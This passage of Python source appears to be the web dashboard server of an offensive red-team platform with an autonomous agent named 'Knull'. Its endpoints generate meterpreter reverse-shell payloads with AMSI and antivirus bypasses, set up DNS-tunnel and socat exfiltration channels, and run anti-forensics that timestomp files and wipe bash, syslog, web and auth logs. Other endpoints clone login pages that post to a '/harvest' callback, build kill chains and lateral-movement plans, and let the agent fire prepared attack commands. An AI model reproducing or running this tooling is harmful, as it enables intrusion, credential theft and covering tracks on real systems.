        _SSE_CLIENTS.append(q)
        self.send_response(200)
        self.send_header("Content-Type", "text/event-stream")
        self.send_header("Cache-Control", "no-cache")
        self.end_headers()
        try:
            with _LOCK:
                snap = dict(_STATE)
                snap.pop("lines", None)
            self.wfile.write(f"data: {json.dumps(snap)}\n\n".encode())
            while True:
                try:
                    msg = q.get(timeout=25)
                    self.wfile.write(f"data: {json.dumps(msg)}\n\n".encode())
                    self.wfile.flush()
                except queue.Empty:
                    self.wfile.write(b": keepalive\n\n")
                    self.wfile.flush()
        except Exception:
            pass
        finally:
            if q in _SSE_CLIENTS:
                _SSE_CLIENTS.remove(q)

    def do_POST(self):
        global _agent_instance, _agent_thread
        path = urlparse(self.path).path
        if path == "/api/scan":
            ln = int(self.headers.get("Content-Length", 0))
            body = json.loads(self.rfile.read(ln) or b"{}")
            dom = (body.get("domain") or "").strip().lower()
            try:
                from core.utils import sanitize_domain
                dom = sanitize_domain(dom)
            except Exception as e:
                return self._json({"ok": False, "error": str(e)}, 400)
            ok = _start_scan(dom, int(body.get("max_subs") or 30))
            if ok:
                with _LOCK:
                    _STATE["auto_agent"] = bool(body.get("auto_agent", True))
            self._json({"ok": ok})
        elif path == "/api/action/propose":
            ln = int(self.headers.get("Content-Length", 0))
            b = json.loads(self.rfile.read(ln) or b"{}")
            from modules import action_center
            act = action_center.propose(b.get("tool", ""), b.get("cmd", ""),
                                        b.get("target", ""), b.get("finding", ""))
            self._json({"ok": bool(act), "action": act})
        elif path == "/api/action/confirm":
            ln = int(self.headers.get("Content-Length", 0))
            b = json.loads(self.rfile.read(ln) or b"{}")
            from modules import action_center
            ok = action_center.approve(b.get("id", ""), bool(b.get("approved")))
            self._json({"ok": ok})
        elif path == "/api/action/terminal":
            ln = int(self.headers.get("Content-Length", 0))
            b = json.loads(self.rfile.read(ln) or b"{}")
            from modules import action_center
            res = action_center.open_terminal(b.get("tool", ""), b.get("cmd", ""),
                                              b.get("target", ""), b.get("finding", ""))
            self._json(res)
        elif path == "/api/term/create":
            from modules import web_terminal
            ln = int(self.headers.get("Content-Length", 0))
            b = json.loads(self.rfile.read(ln) or b"{}")
            self._json(web_terminal.create_session(
                int(b.get("cols") or 120), int(b.get("rows") or 32)))
        elif path == "/api/term/keys":
            from modules import web_terminal
            ln = int(self.headers.get("Content-Length", 0))
            b = json.loads(self.rfile.read(ln) or b"{}")
            self._json(web_terminal.send_keys(b.get("session", ""), b.get("data", "")))
        elif path == "/api/term/screen":
            from modules import web_terminal
            q = parse_qs(u.query)
            self._json(web_terminal.capture(q.get("session", [""])[0]))
        elif path == "/api/term/prefill":
            from modules import web_terminal
            ln = int(self.headers.get("Content-Length", 0))
            b = json.loads(self.rfile.read(ln) or b"{}")
            res = web_terminal.prefill(b.get("session", ""), b.get("cmd", ""))
            res["attach_hint"] = (f"docker exec -it kali-as tmux attach -t "
                                  f"{b.get('session','')}")
            self._json(res)
        elif path == "/api/term/kill":
            from modules import web_terminal
            ln = int(self.headers.get("Content-Length", 0))
            b = json.loads(self.rfile.read(ln) or b"{}")
            self._json(web_terminal.kill_session(b.get("session", "")))
        elif path == "/api/msf/search":
            from modules.redteam import msf_advisor
            ln = int(self.headers.get("Content-Length", 0))
            b = json.loads(self.rfile.read(ln) or b"{}")
            self._json(msf_advisor.search_exploits(b.get("query", "")))
        elif path == "/api/msf/prepare":
            from modules.redteam import msf_advisor
            ln = int(self.headers.get("Content-Length", 0))
            b = json.loads(self.rfile.read(ln) or b"{}")
            self._json(msf_advisor.prepare_terminal(
                b.get("module", ""), b.get("target", ""),
                b.get("payload", ""), b.get("lhost", "")))
        elif path == "/api/waf/scan":
            from modules.waf_detect import assess_hosts
            ln = int(self.headers.get("Content-Length", 0))
            b = json.loads(self.rfile.read(ln) or b"{}")
            import db_store
            data = db_store.get_scan(int(b.get("scan_id") or 0), _DB)
            headers_by_host = {}
            for h in (data.get("hosts") or []):
                # host rows don't store raw headers; fall back to live probe
                pass
            hosts = b.get("hosts") or []
            if not hosts:
                hosts = [h.get("host") for h in (data.get("hosts") or []) if h.get("host")]
            # live probe via curl-style requests for WAF signatures
            import urllib.request, ssl
            hdrs = {}
            for host in hosts[:10]:
                try:
                    ctx = ssl.create_default_context()
                    req = urllib.request.Request(f"https://{host}/",
                                                 headers={"User-Agent": "attack-surface-waf-probe"})
                    with urllib.request.urlopen(req, timeout=8, context=ctx) as resp:
                        hdrs[host] = {"all_headers": dict(resp.headers),
                                      "status_code": resp.status}
                except Exception as e:
                    hdrs[host] = {"all_headers": {}, "status_code": 0,
                                  "error": str(e)[:80]}
            hits = assess_hosts(hdrs, run_evasion=bool(b.get("evasion", True)))
            self._json({"ok": True, "hosts_probed": len(hdrs), "waf_hits": hits})
        elif path == "/api/graph/build":
            from modules.attack_graph import build_graph, find_chains
            import db_store
            ln = int(self.headers.get("Content-Length", 0))
            b = json.loads(self.rfile.read(ln) or b"{}")
            sid = int(b.get("scan_id") or 0)
            data = db_store.get_scan(sid, _DB)
            graph = build_graph(data)
            graph["chains"] = find_chains(data)
            self._json({"ok": True, "graph": graph})
        elif path == "/api/creds/analyze":
            from modules.cred_engine import analyze_scan_for_creds
            import db_store
            ln = int(self.headers.get("Content-Length", 0))
            b = json.loads(self.rfile.read(ln) or b"{}")
            sid = int(b.get("scan_id") or 0)
            data = db_store.get_scan(sid, _DB)
            suggestions = analyze_scan_for_creds(data)
            self._json({"ok": True, "suggestions": suggestions,
                        "count": len(suggestions)})
        elif path == "/api/origin/hunt":
            from modules.origin_hunter import hunt_origin
            import db_store
            ln = int(self.headers.get("Content-Length", 0))
            b = json.loads(self.rfile.read(ln) or b"{}")
            domain = b.get("domain", "")
            sid = b.get("scan_id")
            sub_ips = {}
            if sid:
                data = db_store.get_scan(int(sid), _DB)
                for h in (data.get("hosts") or []):
                    host = h.get("host") or ""
                    ip = h.get("ip") or ""
                    if host and ip:
                        sub_ips[host] = [ip]
            result = hunt_origin(domain, sub_ips)
            self._json({"ok": True, **result})
        elif path == "/api/killchain/build":
            from modules.redteam.kill_chain import kill_chain_from_finding, kill_chain_from_scan
            import db_store
            ln = int(self.headers.get("Content-Length", 0))
            b = json.loads(self.rfile.read(ln) or b"{}")
            sid = b.get("scan_id")
            domain = b.get("domain", "")
            lhost = b.get("lhost", "127.0.0.1")
            lport = int(b.get("lport", 4444))
            findings = []
            if sid:
                data = db_store.get_scan(int(sid), _DB)
                for h in (data.get("hosts") or []):
                    for svc in (h.get("services") or []):
                        findings.append({
                            "host": h.get("host", ""),
                            "port": svc.get("port", 80),
                            "service": svc.get("service", ""),
                            "banner": svc.get("banner", svc.get("tech", "")),
                        })
                for f in (data.get("findings") or []):
                    findings.append({
                        "host": f.get("host", ""),
                        "port": f.get("port", 80),
                        "service": f.get("service", f.get("title", "")),
                        "vuln": f.get("title", f.get("detail", "")),
                        "banner": f.get("detail", ""),
                    })
            if not findings:
                self._json({"ok": True, "plans": [], "summary": "No findings to weaponize"})
                return
            result = kill_chain_from_scan(findings, lhost=lhost, lport=lport)
            self._json({"ok": True, **result})
        elif path == "/api/lateral/build":
            from modules.redteam.lateral_movement import build_lateral_plan, auto_pivot_chain
            import db_store
            ln = int(self.headers.get("Content-Length", 0))
            b = json.loads(self.rfile.read(ln) or b"{}")
            sid = b.get("scan_id")
            source_host = b.get("source_host", "")
            subnet = b.get("subnet", "")
            scan_data = {}
            if sid:
                scan_data = db_store.get_scan(int(sid), _DB)
            internal_subnets = [subnet] if subnet else None
            result = auto_pivot_chain(scan_data, source_host=source_host)
            self._json({"ok": True, **result})
        elif path == "/api/redteam/auto":
            from modules.redteam.auto_pipeline import build_auto_pipeline
            import db_store
            ln = int(self.headers.get("Content-Length", 0))
            b = json.loads(self.rfile.read(ln) or b"{}")
            sid = b.get("scan_id")
            if not sid:
                self._json({"ok": False, "error": "scan_id required"})
                return
            scan_data = db_store.get_scan(int(sid), _DB)
            result = build_auto_pipeline(scan_data)
            self._json({"ok": True, **result})
        elif path == "/api/supply/audit":
            from modules.supply_chain import audit_project
            ln = int(self.headers.get("Content-Length", 0))
            b = json.loads(self.rfile.read(ln) or b"{}")
            project_dir = b.get("project_dir", ".")
            try:
                result = audit_project(project_dir)
                self._json({"ok": True, **result})
            except Exception as e:
                self._json({"ok": False, "error": str(e)})
        elif path == "/api/supply/secrets":
            from modules.supply_chain import scan_for_secrets
            ln = int(self.headers.get("Content-Length", 0))
            b = json.loads(self.rfile.read(ln) or b"{}")
            code = b.get("code", "")
            fname = b.get("file", "snippet")
            if not code:
                self._json({"ok": False, "error": "code required"})
                return
            secrets = scan_for_secrets(code, fname)
            self._json({"ok": True, "secrets": secrets})
        elif path == "/api/supply/typosquat":
            from modules.supply_chain import generate_typosquats
            ln = int(self.headers.get("Content-Length", 0))
            b = json.loads(self.rfile.read(ln) or b"{}")
            brand = b.get("brand", "")
            if not brand:
                self._json({"ok": False, "error": "brand required"})
                return
            variants = generate_typosquats(brand)
            registered = []
            import socket as _sock
            for v in variants:
                try:
                    # skip invalid labels: empty, >63 chars, leading/trailing hyphen
                    bad = (not v or len(v) > 253 or
                           any(len(l) > 63 or l.startswith("-") or l.endswith("-")
                               or not l for l in v.split(".")))
                    if bad:
                        registered.append({"domain": v, "registered": False,
                                           "risk": "low", "skipped": True})
                        continue
                    _sock.gethostbyname(v)
                    registered.append({"domain": v, "registered": True, "risk": "high"})
                except (_sock.gaierror, UnicodeError, ValueError):
                    registered.append({"domain": v, "registered": False, "risk": "low"})
            self._json({"ok": True, "variants": variants, "registered": registered})
        elif path == "/api/cloud/analyze":
            from modules.cloud_attack import build_cloud_attack_path
            ln = int(self.headers.get("Content-Length", 0))
            b = json.loads(self.rfile.read(ln) or b"{}")
            domain = b.get("domain", "")
            if not domain:
                self._json({"ok": False, "error": "domain required"})
                return
            result = build_cloud_attack_path(domain)
            self._json({"ok": True, **result})
        elif path == "/api/advisor/recommend":
            from modules.attack_advisor import recommend_attacks, suggest_next_phase
            import db_store
            ln = int(self.headers.get("Content-Length", 0))
            b = json.loads(self.rfile.read(ln) or b"{}")
            sid = b.get("scan_id")
            if not sid:
                self._json({"ok": False, "error": "scan_id required"})
                return
            scan_data = db_store.get_scan(int(sid), _DB)
            result = recommend_attacks(scan_data)
            self._json({"ok": True, **result})
        elif path == "/api/advisor/next":
            from modules.attack_advisor import suggest_next_phase
            ln = int(self.headers.get("Content-Length", 0))
            b = json.loads(self.rfile.read(ln) or b"{}")
            phase = b.get("phase", "initial_access")
            success = b.get("success", True)
            target_info = b.get("target_info", {})
            suggestions = suggest_next_phase(phase, success, target_info)
            self._json({"ok": True, "suggestions": suggestions})
        elif path == "/api/arsenal/evasion":
            from modules.redteam.evasion import EvasionEngine
            import re as _re
            ln = int(self.headers.get("Content-Length", 0))
            b = json.loads(self.rfile.read(ln) or b"{}")
            eng = EvasionEngine()
            payload = b.get("payload", "windows/x64/meterpreter/reverse_tcp")
            lhost = b.get("lhost", "127.0.0.1")
            lport = b.get("lport", 4444)
            fmt = b.get("format", "exe")
            enc = b.get("encoder", "shikata-ga-nai")
            msf_cmd = eng.msfvenom_generate(payload=payload, lhost=lhost,
                lport=int(lport), format=fmt,
                output=f"/tmp/as_payload_{lhost}_{lport}.{fmt}",
                encoder=enc, iterations=5)
            amsi = eng.generate_amsi_bypass(method="all")
            av = eng.generate_av_evasion(method="all")
            ps_obf = eng.obfuscate_powershell("Write-Output 'test'", techniques=["variable_rename","tick_insert","invoke_expression"])
            self._json({"ok": True,
                "packed_payload": {"command": msf_cmd, "encoder": enc, "format": fmt,
                    "output_file": f"/tmp/as_payload_{lhost}_{lport}.{fmt}"},
                "amsi_bypass": [{"technique": f"AMSI method {i+1}", "mitre_id": "T1562.001", "command": s} for i, s in enumerate(amsi)],
                "av_evasion": [{"technique": f"AV method {i+1}", "mitre_id": "T1562.001", "command": s} for i, s in enumerate(av)],
                "obfuscated_sample": ps_obf})
        elif path == "/api/arsenal/ad":
            from modules.redteam.ad_attacks import generate_attack_plan
            ln = int(self.headers.get("Content-Length", 0))
            b = json.loads(self.rfile.read(ln) or b"{}")
            domain = b.get("domain", "")
            dc_ip = b.get("dc_ip", "")
            user = b.get("user") or None
            password = b.get("password") or None
            ca = b.get("ca_server") or None
            if not domain or not dc_ip:
                self._json({"ok": False, "error": "domain and dc_ip required"})
                return
            plan = generate_attack_plan(domain=domain, dc_ip=dc_ip,
                ca_server=ca, user=user, password=password)
            self._json({"ok": True, "plan": plan})
        elif path == "/api/arsenal/exfil":
            from modules.redteam.data_exfil import DataExfiltration
            from modules.redteam.anti_forensics import AntiForensics
            ln = int(self.headers.get("Content-Length", 0))
            b = json.loads(self.rfile.read(ln) or b"{}")
            exfil = DataExfiltration()
            channels = []
            exfil_calls = [
                ("dnscat2_server", {"domain": "tunnel.local", "lport": 53}),
                ("iodine_server", {"domain": "tunnel.local", "lport": 53}),
                ("ngrok_tunnel", {"local_port": 8080, "proto": "http"}),
                ("socat_reverse_shell", {"lhost": "127.0.0.1", "lport": 4444}),
                ("chisel_server", {"lport": 8080}),
                ("lcx_tunnel", {"listen_port": 8080, "remote_host": "127.0.0.1", "remote_port": 9090}),
            ]
            for m, kwargs in exfil_calls:
                if hasattr(exfil, m):
                    try:
                        r = getattr(exfil, m)(**kwargs)
                        if isinstance(r, dict):
                            r["name"] = r.get("name", m)
                            channels.append(r)
                    except Exception:
                        pass
            af = AntiForensics()
            forensics = []
            forensics_calls = [
                ("timestomp_file", {"target_file": "/tmp/suspicious.sh", "reference_file": "/etc/passwd"}),
                ("cleanup_bash_history", {}),
                ("cleanup_syslog", {}),
                ("cleanup_web_logs", {"webroot": "/var/www/html"}),
                ("cleanup_auth_logs", {}),
                ("cleanup_temp_files", {}),
            ]
            for m, kwargs in forensics_calls:
                if hasattr(af, m):
                    try:
                        r = getattr(af, m)(**kwargs)
                        if isinstance(r, dict):
                            r["name"] = r.get("name", m)
                            forensics.append(r)
                    except Exception:
                        pass
            self._json({"ok": True, "channels": channels, "forensics": forensics})
        elif path == "/api/phish/mirror":
            from modules.phishing_engine import generate_mirror_html
            ln = int(self.headers.get("Content-Length", 0))
            b = json.loads(self.rfile.read(ln) or b"{}")
            domain = b.get("domain", "")
            org_name = b.get("org_name", "")
            template = b.get("template", "google")
            html = generate_mirror_html(template, "/harvest", org_name or domain)
            self._json({"ok": True, "template": template,
                        "org_name": org_name or domain,
                        "callback": "/harvest",
                        "size": len(html),
                        "html": html})
        elif path == "/api/phish/campaign":
            from modules.phishing_engine import build_phishing_plan
            ln = int(self.headers.get("Content-Length", 0))
            b = json.loads(self.rfile.read(ln) or b"{}")
            domain = b.get("domain", "")
            name = b.get("campaign_name", "Campaign")
            template = b.get("template", "google")
            if not domain:
                self._json({"ok": False, "error": "domain required"})
                return
            plan = build_phishing_plan(domain, org_name=name,
                                       template=template)
            self._json({"ok": True, "campaign_name": name, **plan})
        elif path == "/api/phish/osint":
            from modules.osint_people import people_intel_report
            ln = int(self.headers.get("Content-Length", 0))
            b = json.loads(self.rfile.read(ln) or b"{}")
            domain = b.get("domain", "")
            person_name = b.get("person_name", "")
            username = b.get("username", "")
            report = people_intel_report(domain=domain,
                                        person_name=person_name,
                                        username=username)
            self._json({"ok": True, **report})
        elif path == "/api/agent/start":
            from modules.knull import Knull
            import threading
            ln = int(self.headers.get("Content-Length", 0))
            b = json.loads(self.rfile.read(ln) or b"{}")
            global _agent_instance, _agent_thread
            sid = int(b.get("scan_id") or 0)
            dom = (b.get("target_domain") or "").strip().lower()
            if not sid and dom:
                _launch_agent(dom, bool(b.get("auto_execute", False)),
                              int(b.get("max_iterations") or 10))
                self._json({"ok": True,
                            "agent_id": _agent_instance.agent_id if _agent_instance else None,
                            "status": _agent_instance.get_status() if _agent_instance else {}})
                return
            _agent_instance = _apply_knull_cfg(Knull(
                scan_id=b.get("scan_id", 0),
                target_domain=b.get("target_domain", ""),
                max_iterations=b.get("max_iterations", 10),
                auto_execute=b.get("auto_execute", False),
                event_callback=_agent_event,
                db_path=_DB,
            ))
            _agent_thread = threading.Thread(
                target=_agent_instance.start, daemon=True)
            _agent_thread.start()
            self._json({"ok": True, "agent_id": _agent_instance.agent_id,
                        "status": _agent_instance.get_status()})
        elif path == "/api/agent/stop":
            if _agent_instance:
                _agent_instance.stop()
            self._json({"ok": True,
                        "status": _agent_instance.get_status() if _agent_instance else {}})
        elif path == "/api/agent/status":
            if _agent_instance:
                self._json({"ok": True, "status": _agent_instance.get_status()})
            else:
                self._json({"ok": True, "status": {"state": "idle", "events": [], "kill_chain": {}}})
        elif path == "/api/agent/fire":
            # Manual fire: the operator names a prepared command by key.
            # The command string itself always comes from Knull's own
            # event log — never from this request body.
            if not _agent_instance:
                self._json({"ok": False, "error": "no agent instance"})
                return
            ln = int(self.headers.get("Content-Length", 0))
            b = json.loads(self.rfile.read(ln) or b"{}")
            tk = str(b.get("target_key") or "")
            if not tk:
                self._json({"ok": False, "error": "target_key required"})
                return
            result = _agent_instance.fire(tk)
            if result.get("ok"):
                result["status"] = _agent_instance.get_status()
            self._json(result)
        elif path == "/api/agent/record":
            # Operator's own verdict on something they ran outside Knull.
            if not _agent_instance:
                self._json({"ok": False,
                            "error": "launch Knull first (it owns the memory)"})
                return
            ln = int(self.headers.get("Content-Length", 0))
            b = json.loads(self.rfile.read(ln) or b"{}")
            out = _agent_instance.record_attempt(
                technique=str(b.get("technique") or ""),
                target=str(b.get("target") or ""),
                outcome=str(b.get("outcome") or ""),
                output=str(b.get("output") or ""),
                source=str(b.get("source") or "operator"))
            if out.get("ok"):
                out["status"] = _agent_instance.get_status()
            self._json(out)
        elif path == "/api/agent/learn":
            # Learning scoreboard: whose picks are actually working.
            import db_store
            dom = str(parse_qs(urlparse(self.path).query).get("domain", [""])[0])
            self._json({"ok": True,
                        "scoreboard": db_store.knull_scoreboard(
                            domain=dom or None, db_path=_DB)})
        elif path == "/api/report/generate":
            from modules import ops_report
            ln = int(self.headers.get("Content-Length", 0))
            b = json.loads(self.rfile.read(ln) or b"{}")
            self._json(ops_report.generate(
                db_path=_DB, agent=_agent_instance,
                scan_id=b.get("scan_id"), domain=b.get("domain") or None,
                template=str(b.get("template") or "all")))
        elif path == "/api/report/raw":
            from modules import ops_report
            ln = int(self.headers.get("Content-Length", 0))
            b = json.loads(self.rfile.read(ln) or b"{}")
            body = ops_report.read_report(str(b.get("file") or ""))
            if body is None:
                self.send_error(404, "report not found")
                return
            raw = body.encode()
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(raw)))
            self.end_headers()
            self.wfile.write(raw)
        elif path == "/api/asm/changes":
            # Continuous ASM: what appeared/disappeared since last scan.
            import dataclasses
            from modules.asm import ASMDatabase
            try:
                rows = ASMDatabase().get_unacknowledged_changes()
                self._json({"ok": True,
                            "changes": [dataclasses.asdict(r) for r in rows]})
            except Exception as e:
                self._json({"ok": False, "error": str(e)[:200], "changes": []})
        elif path == "/api/asm/ack":
            from modules.asm import ASMDatabase
            ln = int(self.headers.get("Content-Length", 0))
            b = json.loads(self.rfile.read(ln) or b"{}")
            try:
                ASMDatabase().acknowledge_change(int(b.get("id")))
                self._json({"ok": True})
            except Exception as e:
                self._json({"ok": False, "error": str(e)[:200]})
        elif path == "/api/arsenal/ready":
            # Ready-to-run commands, built only from data already on disk.
            from modules import ops_arsenal
            ln = int(self.headers.get("Content-Length", 0))
            b = json.loads(self.rfile.read(ln) or b"{}")
            self._json({"ok": True, **ops_arsenal.ready_actions(
                db_path=_DB, agent=_agent_instance,
                scan_id=b.get("scan_id"))})
        elif path == "/api/agent/evidence":
            # The raw proof behind each verdict — what a finding claims,
            # backed by the response that actually came back.
            import db_store
            ln = int(self.headers.get("Content-Length", 0))
            b = json.loads(self.rfile.read(ln) or b"{}")
            rows = db_store.list_evidence(
                limit=int(b.get("limit") or 40),
                target=(b.get("target") or None), db_path=_DB)
            self._json({"ok": True, "evidence": rows})
        elif path == "/api/agent/config":
            # Ops console: read or change Knull's runtime settings.
            # No body -> read; with a body -> apply (live agent) or save
            # for the next launch. Execution stays a per-shot decision.
            ln = int(self.headers.get("Content-Length", 0))
            b = json.loads(self.rfile.read(ln) or b"{}")
            if not b:
                cfg = (_agent_instance.config() if _agent_instance
                       else (_STATE.get("knull_cfg") or {}))
                self._json({"ok": True, "config": cfg,
                            "agent_running": bool(
                                _agent_instance and
                                getattr(_agent_instance, "_running", False))})
                return
            if _agent_instance:
                out = _agent_instance.configure(b)
                with _LOCK:
                    _STATE["knull_cfg"] = dict(_agent_instance.config())
                self._json(out)
                return
            with _LOCK:
                _STATE["knull_cfg"] = {**(_STATE.get("knull_cfg") or {}), **b}
            self._json({"ok": True, "applied": b, "saved": True,
                        "config": _STATE["knull_cfg"],
                        "note": "no agent running — stored for the next launch"})
        elif path == "/api/agent/runs":
            # Session history — persists across dashboard restarts.
            import db_store
            runs = db_store.list_knull_runs(limit=20, db_path=_DB)
            self._json({"ok": True, "runs": runs})
        elif path == "/api/agent/run":
            import db_store
            ln = int(self.headers.get("Content-Length", 0))
            b = json.loads(self.rfile.read(ln) or b"{}")
            run = db_store.get_knull_run(str(b.get("agent_id") or ""), _DB)
            self._json({"ok": bool(run), "run": run})
        elif path == "/api/knull/chat":
            # Operator <-> Knull conversation. The model only ever sees the
            # context built from our own data, and any action it proposes is
            # returned for the operator to click — never executed here.
            from modules import knull_counsel
            ln = int(self.headers.get("Content-Length", 0))
            b = json.loads(self.rfile.read(ln) or b"{}")
            context = knull_counsel.build_context(db_path=_DB,
                                                  agent=_agent_instance)
            out = knull_counsel.chat(
                str(b.get("message") or ""),
                history=b.get("history") or [],
                context=context)
            out["context_len"] = len(context)
            self._json(out)
        elif path == "/api/impact/start":
            # Baseline the latest scan, then re-scan after the shot so
            # _finish_impact can diff the two.
            if not _agent_instance:
                self._json({"ok": False,
                            "error": "launch Knull first — it holds the shot"})
                return
            if _STATE.get("running"):
                self._json({"ok": False, "error": "a scan is already running"})
                return
            ln = int(self.headers.get("Content-Length", 0))
            b = json.loads(self.rfile.read(ln) or b"{}")
            tk = str(b.get("target_key") or "")
            prep = next((p for p in _agent_instance.prepared_commands()
                         if p["target_key"] == tk), None)
            if not prep:
                self._json({"ok": False, "error": "no such prepared command"})
                return
            if not _agent_instance._in_scope(prep["target"]):
                self._json({"ok": False,
                            "error": _agent_instance._scope_error(prep["target"])})
                return
            import db_store
            scans = db_store.list_scans(_DB)
            baseline = int(scans[0]["id"]) if scans else 0
            if not baseline:
                self._json({"ok": False, "error": "no baseline scan to compare"})
                return
            dom = (getattr(_agent_instance, "target_domain", "")
                   or prep["target"] or "").strip()
            if not dom:
                self._json({"ok": False, "error": "could not resolve domain"})
                return
            max_subs = int(b.get("max_subs") or 30)
            with _LOCK:
                _STATE["impact"] = {
                    "phase": "running", "baseline": baseline,
                    "target_key": tk, "technique": prep["technique"],
                    "target": prep["target"], "domain": dom,
                    "started": time.time(), "changed": None,
                    "summary": "", "diff": None, "error": None,
                }
            # impact re-scans run the full pipeline (httpx/nuclei), so they
            # get a larger budget than an interactive scan — being killed
            # at the default 30 min produced no row to diff against.
            if not _start_scan(dom, max_subs,
                               timeout_s=int(b.get("timeout_s") or 2700)):
                with _LOCK:
                    _STATE.pop("impact", None)
                self._json({"ok": False,
                            "error": "could not start the re-scan"})
                return
            self._json({"ok": True, "impact": _STATE["impact"],
                        "baseline": baseline})
        elif path == "/api/impact":
            with _LOCK:
                imp = _STATE.get("impact")
            self._json({"ok": True, "impact": imp})
        else:
            self.send_error(404)


def _state_payload() -> dict:
    import db_store
    scans = db_store.list_scans(_DB)
    latest = None
    n_findings = 0
    if scans:
        data = db_store.get_scan(scans[0]["id"], _DB)
        # DB returns findings as list-of-rows; group by host for the UI
        by_host: dict = {}
        for row in data["findings"] or []:
            by_host.setdefault(row["host"], []).append(
                {"title": row.get("title") or "",
                 # keep None so the UI can infer severity from finding text
                 "severity": row.get("severity")})
        latest = {
            "id": data["id"], "ts": data["ts"], "domain": data["domain"],
            "risk_score": data["risk_score"], "risk_level": data["risk_level"],
            "findings": by_host, "hosts": data["hosts"],
            "subdomains": data["subdomains"],
            "sections": data.get("sections", {}),
            "redteam_actions": (data.get("sections") or {}).get("redteam_actions") or [],
        }
        n_findings = sum(len(v) for v in by_host.values())
    with _LOCK:
        live = {k: _STATE[k] for k in
                ("running", "domain", "phase", "progress", "exit")}
        live_lines = _STATE["lines"][-14:]
    if not live_lines:
        # server restarted after the scan — read the persisted log
        try:
            _proj = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
            with open(os.path.join(_proj, "reports", "last_scan.log")) as fh:
                live_lines = fh.read().splitlines()[-14:]
        except Exception:
            pass
    return {"scans": scans, "latest": latest, "n_findings": n_findings,
            "live": live, "live_lines": live_lines}


def serve(host: str = "127.0.0.1", port: int = 8443, db_path: str | None = None) -> None:
    global _DB
    import db_store
    _DB = db_path
    db_store.list_scans(_DB)  # ensure schema
    srv = ThreadingHTTPServer((host, port), Handler)
    print(f"[+] Dashboard: http://{host}:{port}  (Ctrl+C to stop)")
    srv.serve_forever()


if __name__ == "__main__":
    import argparse

    ap = argparse.ArgumentParser(prog="dashboard")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=8443)
    ap.add_argument("--db", default=None)
    _a = ap.parse_args()
    try:
        serve(_a.host, _a.port, _a.db)
    except KeyboardInterrupt:
        print("\n[!] stopped")
